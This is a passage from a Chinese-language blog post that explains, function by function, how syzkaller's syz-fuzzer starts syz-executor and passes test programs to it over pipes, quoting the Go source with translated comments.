go">data := item.p.Serialize()<br>sig := hash.Hash(data)<br><br>log.Logf(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;added new input for %v to corpus:\n%s&quot;</span>, logCallName, data)<br>proc.fuzzer.sendInputToManager(rpctype.Input&#123;<br>Call:     callName,<br>CallID:   item.call,<br>Prog:     data,<br>Signal:   inputSignal.Serialize(),<br>Cover:    inputCover.Serialize(),<br>RawCover: rawCover,<br>&#125;)<br><br>proc.fuzzer.addInputToCorpus(item.p, inputSignal, sig)<br><br><span class="hljs-keyword">if</span> item.flags&amp;ProgSmashed == <span class="hljs-number">0</span> &#123;<br>proc.fuzzer.workQueue.enqueue(&amp;WorkSmash&#123;item.p, item.call&#125;)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="②-proc-execute-：执行输入，将有意思的输入放到-traige-队列"><a href="#②-proc-execute-：执行输入，将有意思的输入放到-traige-队列" class="headerlink" title="② proc.execute()：执行输入，将有意思的输入放到 traige 队列"></a>② proc.execute()：执行输入，将有意思的输入放到 traige 队列</h3><p>该函数的逻辑比较简单，主要便是调用 <code>proc.executeRaw()</code> 执行传入的输入，并调用 <code>checkNewSignal()</code> 检查执行的结果，将其中有意思的那些放入 traige 队列：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> execute(execOpts *ipc.ExecOpts, p *prog.Prog, flags ProgTypes, stat Stat) *ipc.ProgInfo &#123;<br>info := proc.executeRaw(execOpts, p, stat)<br><span class="hljs-keyword">if</span> info == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>calls, extra := proc.fuzzer.checkNewSignal(p, info)<br><span class="hljs-keyword">for</span> _, callIndex := <span class="hljs-keyword">range</span> calls &#123;<br>proc.enqueueCallTriage(p, flags, callIndex, info.Calls[callIndex])<br>&#125;<br><span class="hljs-keyword">if</span> extra &#123;<br>proc.enqueueCallTriage(p, flags, <span class="hljs-number">-1</span>, info.Extra)<br>&#125;<br><span class="hljs-keyword">return</span> info<br>&#125;<br></code></pre></td></tr></table></figure><p><code>executeRaw()</code> 函数的主要逻辑其实就是先检查禁用的系统调用然后是一个伪无限循环调用 <code>proc.env.Exec()</code> 执行输入（好多层套娃），若执行失败则进行错误记录并休眠 1s 后重新进行，执行成功则直接返回</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> executeRaw(opts *ipc.ExecOpts, p *prog.Prog, stat Stat) *ipc.ProgInfo &#123;<br>proc.fuzzer.checkDisabledCalls(p)<br><br><span class="hljs-comment">// 限制并发窗口，每隔一段时间进行一次泄漏检查.</span><br>ticket := proc.fuzzer.gate.Enter()<br><span class="hljs-keyword">defer</span> proc.fuzzer.gate.Leave(ticket)<br><br>proc.logProgram(opts, p)<br><span class="hljs-keyword">for</span> try := <span class="hljs-number">0</span>; ; try++ &#123;<br>atomic.AddUint64(&amp;proc.fuzzer.stats[stat], <span class="hljs-number">1</span>)<br>output, info, hanged, err := proc.env.Exec(opts, p)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err == prog.ErrExecBufferTooSmall &#123;<br><span class="hljs-comment">// 若我们系统地在序列化程序上失败则非常糟糕,</span><br><span class="hljs-comment">// 但目前为止除了统计以外我们没有更好的处理方式.</span><br><span class="hljs-comment">// 该错误在 seeded seeded syz_mount_image 调用上观察到很多.</span><br>atomic.AddUint64(&amp;proc.fuzzer.stats[StatBufferTooSmall], <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">if</span> try &gt; <span class="hljs-number">10</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;executor %v failed %v times: %v&quot;</span>, proc.pid, try, err)<br>&#125;<br>log.Logf(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;fuzzer detected executor failure=&#x27;%v&#x27;, retrying #%d&quot;</span>, err, try+<span class="hljs-number">1</span>)<br>debug.FreeOSMemory()<br>time.Sleep(time.Second)<br><span class="hljs-keyword">continue</span><br>&#125;<br>log.Logf(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;result hanged=%v: %s&quot;</span>, hanged, output)<br><span class="hljs-keyword">return</span> info<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Env-Exec-：启动-syz-executor-并将输入程序序列化后交给其执行"><a href="#Env-Exec-：启动-syz-executor-并将输入程序序列化后交给其执行" class="headerlink" title="Env.Exec()：启动 syz-executor 并将输入程序序列化后交给其执行"></a>Env.Exec()：启动 syz-executor 并将输入程序序列化后交给其执行</h4><p><code>Env.Exec()</code> 函数用来启动 syz-executor 并将输入交给其进行执行，<strong>syz-executor 在被启动后会一直等待 syz-fuzzer 传来的输入并执行</strong>，而不是每个输入都要重新启动一次 executor：</p><ul><li>首先将输入序列化到 <code>env.in</code> （作为 syz-executor 的输入，syz-executor 会反序列化后再将其执行），并将 <code>env.out</code> 的前 4 字节（<code>ncmd and nsig</code> ）置 0；这里我们注意到 syz-fuzzer 与 syz-executor 间有两种传递数据的方式：管道&#x2F;共享内存</li><li>接下来检查 executor 是否已启动，若未启动（ <code>env.cmd == nil</code> ）则调用 <code>makeCommand()</code> <strong>启动 syz-executor</strong></li><li>接下来调用 <code>cmd.exec()</code> <strong>真正开始让 syz-executor 执行程序</strong>，若出错则关闭 syz-executor（等 <code>executeRaw()</code> 的下次循环重新启动）</li><li>最后解析程序输出，返回结果</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Exec 启动 executor 二进制文件以执行程序 p 并返回关于执行的信息:</span><br><span class="hljs-comment">// output: 程序输出</span><br><span class="hljs-comment">// info: per-call info</span><br><span class="hljs-comment">// hanged: 程序挂起且被杀死</span><br><span class="hljs-comment">// err0: 启动程序失败或是 executor 自身有问题.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(env *Env)</span></span> Exec(opts *ExecOpts, p *prog.Prog) (output []<span class="hljs-type">byte</span>, info *ProgInfo, hanged <span class="hljs-type">bool</span>, err0 <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// Copy-in serialized program.</span><br>progSize, err := p.SerializeForExec(env.in)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>err0 = err<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">var</span> progData []<span class="hljs-type">byte</span><br><span class="hljs-keyword">if</span> !env.config.UseShmem &#123;<br>progData = env.in[:progSize]<br>&#125;<br><span class="hljs-comment">// 清零前两个字 (ncmd and nsig), 由此若 executor 在写入非垃圾数据前崩溃，</span><br><span class="hljs-comment">// 我们在这里便没有垃圾.</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++ &#123;<br>env.out[i] = <span class="hljs-number">0</span><br>&#125;<br><br>atomic.AddUint64(&amp;env.StatExecs, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> env.cmd == <span class="hljs-literal">nil</span> &#123; <span class="hljs-comment">/* syz-executor 未启动 */</span><br><span class="hljs-keyword">if</span> p.Target.OS != targets.TestOS &amp;&amp; targets.Get(p.Target.OS, p.Target.Arch).HostFuzzer &#123;<br><span class="hljs-comment">// executor 实际上是 ssh,</span><br><span class="hljs-comment">// 太频繁地启动他们会导致延迟.</span><br>&lt;-rateLimit.C<br>&#125;<br>tmpDirPath := <span class="hljs-string">&quot;./&quot;</span><br>atomic.AddUint64(&amp;env.StatRestarts, <span class="hljs-number">1</span>)<br>env.cmd, err0 = makeCommand(env.pid, env.bin, env.config, env.inFile, env.outFile, env.out, tmpDirPath)<br><span class="hljs-keyword">if</span> err0 != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>output, hanged, err0 = env.cmd.exec(opts, progData)<span class="hljs-comment">/* 执行输入 */</span><br><span class="hljs-keyword">if</span> err0 != <span class="hljs-literal">nil</span> &#123; <span class="hljs-comment">/* 出错，关闭 executor */</span><br>env.cmd.<span class="hljs-built_in">close</span>()<br>env.cmd = <span class="hljs-literal">nil</span><br><span class="hljs-keyword">return</span><br>&#125;<br><br>info, err0 = env.parseOutput(p, opts)<br><span class="hljs-keyword">if</span> info != <span class="hljs-literal">nil</span> &amp;&amp; env.config.Flags&amp;FlagSignal == <span class="hljs-number">0</span> &#123;<br>addFallbackSignal(p, info)<br>&#125;<br><span class="hljs-keyword">if</span> !env.config.UseForkServer &#123;<br>env.cmd.<span class="hljs-built_in">close</span>()<br>env.cmd = <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="【核心】makeCommand-：建立通信管道，启动-syz-executor"><a href="#【核心】makeCommand-：建立通信管道，启动-syz-executor" class="headerlink" title="【核心】makeCommand()：建立通信管道，启动 syz-executor"></a>【核心】makeCommand()：建立通信管道，启动 syz-executor</h4><p><code>makeCommand()</code> 函数是真正启动 syz-executor 的函数，其首先会先创建一个临时文件夹 <code>syzkaller-testdir</code> 并更改权限为 <code>0777</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">makeCommand</span><span class="hljs-params">(pid <span class="hljs-type">int</span>, bin []<span class="hljs-type">string</span>, config *Config, inFile, outFile *os.File, outmem []<span class="hljs-type">byte</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">tmpDirPath <span class="hljs-type">string</span>)</span></span> (*command, <span class="hljs-type">error</span>) &#123;<br>dir, err := os.MkdirTemp(tmpDirPath, <span class="hljs-string">&quot;syzkaller-testdir&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create temp dir: %v&quot;</span>, err)<br>&#125;<br>dir = osutil.Abs(dir)<br><br>timeout := config.Timeouts.Program<br><span class="hljs-keyword">if</span> config.UseForkServer &#123;<br><span class="hljs-comment">// 在启用了 fork server 时，Executor 有一个内部的 timeout，可以防止大部分的挂起，</span><br><span class="hljs-comment">// 因此我们用一个非常大的 timeout. Executor 可以因为命名空间中的全局锁与其他东西而变慢，</span><br><span class="hljs-comment">// 故我们最好等待，而非上报虚假的误导性 crashes.</span><br>timeout *= <span class="hljs-number">10</span><br>&#125;<br><br>c := &amp;command&#123;<br>pid:     pid,<br>config:  config,<br>timeout: timeout,<br>dir:     dir,<br>outmem:  outmem,<br>&#125;<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> c != <span class="hljs-literal">nil</span> &#123;<br>c.<span class="hljs-built_in">close</span>()<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">if</span> err := os.Chmod(dir, <span class="hljs-number">0777</span>); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to chmod temp dir: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来创建三个用以与 <code>syz-executor</code> 通信的管道，分别用于捕获输出、向 executor 传递命令、从 executor 接收命令：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Output 捕获管道.</span><br>rp, wp, err := os.Pipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create pipe: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> wp.Close()<br><br><span class="hljs-comment">// executor-&gt;ipc 命令管道.</span><br>inrp, inwp, err := os.Pipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create pipe: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> inwp.Close()<br>c.inrp = inrp<br><br><span class="hljs-comment">// ipc-&gt;executor 命令管道.</span><br>outrp, outwp, err := os.Pipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create pipe: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> outrp.Close()<br>c.outwp = outwp<br><br>c.readDone = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> []<span class="hljs-type">byte</span>, <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>接下来会调用 <code>osutil</code> 中的 <code>Command()</code> 创建一个 <code>exec.Cmd</code> 实例（该函数为 golag 原生的 <code>exec.Command()</code> 的 wrapper），executor 实际上要等到后面显式调用 <code>Start()</code> 或 <code>Run()</code> 才正式开始运行（参见<a href="https://books.studygolang.com/The-Golang-Standard-Library-by-Example/chapter10/10.1.html">创建进程 · Go语言标准库</a>）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">cmd := osutil.Command(bin[<span class="hljs-number">0</span>], bin[<span class="hljs-number">1</span>:]...)<br><span class="hljs-keyword">if</span> inFile != <span class="hljs-literal">nil</span> &amp;&amp; outFile != <span class="hljs-literal">nil</span> &#123;<br>cmd.ExtraFiles = []*os.File&#123;inFile, outFile&#125;<br>&#125;<br>cmd.Dir = dir<br><span class="hljs-comment">// Tell ASAN to not mess with our NONFAILING.</span><br>cmd.Env = <span class="hljs-built_in">append</span>(<span class="hljs-built_in">append</span>([]<span class="hljs-type">string</span>&#123;&#125;, os.Environ()...), <span class="hljs-string">&quot;ASAN_OPTIONS=handle_segv=0 allow_user_segv_handler=1&quot;</span>)<br>cmd.Stdin = outrp<br>cmd.Stdout = inwp<br></code></pre></td></tr></table></figure><p>若是未设置 <code>FlagDebug</code> 则还会启动一个新的协程持续读取 syz-executor 输出管道中的内容：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> config.Flags&amp;FlagDebug != <span class="hljs-number">0</span> &#123;<br><span class="hljs-built_in">close</span>(c.readDone)<br>cmd.Stderr = os.Stdout<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>cmd.Stderr = wp<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *command)</span></span> &#123;<br><span class="hljs-comment">// 读出输出以防 executor 持续地打印一些东西。</span><br><span class="hljs-keyword">const</span> bufSize = <span class="hljs-number">128</span> &lt;&lt; <span class="hljs-number">10</span><br>output := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, bufSize)<br><span class="hljs-keyword">var</span> size <span class="hljs-type">uint64</span><br><span class="hljs-keyword">for</span> &#123;<br>n, err := rp.Read(output[size:])<br><span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">0</span> &#123;<br>size += <span class="hljs-type">uint64</span>(n)<br><span class="hljs-keyword">if</span> size &gt;= bufSize*<span class="hljs-number">3</span>/<span class="hljs-number">4</span> &#123;<br><span class="hljs-built_in">copy</span>(output, output[size-bufSize/<span class="hljs-number">2</span>:size])<br>size = bufSize / <span class="hljs-number">2</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>rp.Close()<br>c.readDone &lt;- output[:size]<br><span class="hljs-built_in">close</span>(c.readDone)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>&#125;(c)<br>&#125;<br></code></pre></td></tr></table></figure><p>最后调用 <code>cmd.Start()</code> 真正启动 syz-executor（该方法不会阻塞父进程），并启动一个新的协程等待 syz-executor 的退出：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> err := cmd.Start(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to start executor binary: %v&quot;</span>, err)<br>&#125;<br>c.exited = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">error</span>, <span class="hljs-number">1</span>)<br>c.cmd = cmd<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *command)</span></span> &#123;<br>err := c.cmd.Wait()<br>c.exited &lt;- err<br><span class="hljs-built_in">close</span>(c.exited)<br><span class="hljs-comment">// 若 cmd.Stderr 已被泄露给另一个活动进程，防止 livelock.</span><br>rp.SetDeadline(time.Now().Add(<span class="hljs-number">5</span> * time.Second))<br>&#125;(c)<br>wp.Close()<br><span class="hljs-comment">// 注意: 尽管我们在上面 defer 了，我们在调用🤝前明确地关闭 inwp.</span><br><span class="hljs-comment">// 若我们不这么做且 executor 在写入🤝答复前退出了,</span><br><span class="hljs-comment">// 由于我们持有另一个打开的管道末端，从 inrp 上读取将挂起.</span><br>inwp.Close()<br><br><span class="hljs-keyword">if</span> c.config.UseForkServer &#123;<br><span class="hljs-keyword">if</span> err := c.handshake(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br>tmp := c<br>c = <span class="hljs-literal">nil</span> <span class="hljs-comment">// disable defer above</span><br><span class="hljs-keyword">return</span> tmp, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="【核心】cmd-exec-：将单个程序输入传递给-syz-executor-执行"><a href="#【核心】cmd-exec-：将单个程序输入传递给-syz-executor-执行" class="headerlink" title="【核心】cmd.exec()：将单个程序输入传递给 syz-executor 执行"></a>【核心】cmd.exec()：将单个程序输入传递给 syz-executor 执行</h4><p><code>command.exec()</code> 函数用以将一个序列化后的输入传递给 syz-executor 进程执行，传递的方式主要是通过在 <code>makeCommand()</code> 中建立的 <code>ipc→executor</code> 管道完成的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *command)</span></span> exec(opts *ExecOpts, progData []<span class="hljs-type">byte</span>) (output []<span class="hljs-type">byte</span>, hanged <span class="hljs-type">bool</span>, err0 <span class="hljs-type">error</span>) &#123;<br>req := &amp;executeReq&#123;<br>magic:            inMagic,<br>envFlags:         <span class="hljs-type">uint64</span>(c.config.Flags),<br>execFlags:        <span class="hljs-type">uint64</span>(opts.Flags),<br>pid:              <span class="hljs-type">uint64</span>(c.pid),<br>syscallTimeoutMS: <span class="hljs-type">uint64</span>(c.config.Timeouts.Syscall / time.Millisecond),<br>programTimeoutMS: <span class="hljs-type">uint64</span>(c.config.Timeouts.Program / time.Millisecond),<br>slowdownScale:    <span class="hljs-type">uint64</span>(c.config.Timeouts.Scale),<br>progSize:         <span class="hljs-type">uint64</span>(<span class="hljs-built_in">len</span>(progData)),<br>&#125;<br>reqData := (*[unsafe.Sizeof(*req)]<span class="hljs-type">byte</span>)(unsafe.Pointer(req))[:]<br><span class="hljs-keyword">if</span> _, err := c.outwp.Write(reqData); err != <span class="hljs-literal">nil</span> &#123;<br>output = &lt;-c.readDone<br>err0 = fmt.Errorf(<span class="hljs-string">&quot;executor %v: failed to write control pipe: %v&quot;</span>, c.pid, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> progData != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> _, err := c.outwp.Write(progData); err != <span class="hljs-literal">nil</span> &#123;<br>output = &lt;-c.readDone<br>err0 = fmt.Errorf(<span class="hljs-string">&quot;executor %v: failed to write control pipe: %v&quot;</span>, c.pid, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-comment">// 在这个点程序已经开始运行了.</span><br></code></pre></td></tr></table></figure><p>对于单个输入程序的传输实际上会先传递一个 <code>executeReq</code> 头部，接下来再传递序列化后的输入程序：</p><p><img src="https://s2.loli.net/2023/04/24/I6od1evyCE3MZWH.png" alt="image.png"></p><p>当数据传递过去之后<strong>输入程序就已经开始执行了</strong>，因此该函数后面的部分就都是对结果的处理；）</p><p>完成数据发送后会启动一个协程定时等待 executor 执行完毕，若超时则会将 executor 给 kill 掉：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go">done := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)<br>hang := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>t := time.NewTimer(c.timeout)<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-t.C:<br>c.cmd.Process.Kill()<br>hang &lt;- <span class="hljs-literal">true</span><br><span class="hljs-keyword">case</span> &lt;-done:<br>t.Stop()<br>hang &lt;- <span class="hljs-literal">false</span><br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><p>随后是一个无限大循环，从 <code>executor→ipc</code> 管道中读取 syz-executor 的执行结果，同样是一个 header <code>executeReply</code> 带一份数据 <code>callReply</code> ，单次请求可能有多份返回数据因此这里是一个无限循环，通过 <code>executeReply</code> 中的 <code>done</code> 标志位标识结束：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go">exitStatus := <span class="hljs-number">-1</span><br>completedCalls := (*<span class="hljs-type">uint32</span>)(unsafe.Pointer(&amp;c.outmem[<span class="hljs-number">0</span>]))<br>outmem := c.outmem[<span class="hljs-number">4</span>:]<br><span class="hljs-keyword">for</span> &#123;<br>reply := &amp;executeReply&#123;&#125;<br>replyData := (*[unsafe.Sizeof(*reply)]<span class="hljs-type">byte</span>)(unsafe.Pointer(reply))[:]<br><span class="hljs-keyword">if</span> _, err := io.ReadFull(c.inrp, replyData); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> reply.magic != outMagic &#123;<br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;executor %v: got bad reply magic 0x%x\n&quot;</span>, c.pid, reply.magic)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-keyword">if</span> reply.done != <span class="hljs-number">0</span> &#123;<br>exitStatus = <span class="hljs-type">int</span>(reply.status)<br><span class="hljs-keyword">break</span><br>&#125;<br>callReply := &amp;callReply&#123;&#125;<br>callReplyData := (*[unsafe.Sizeof(*callReply)]<span 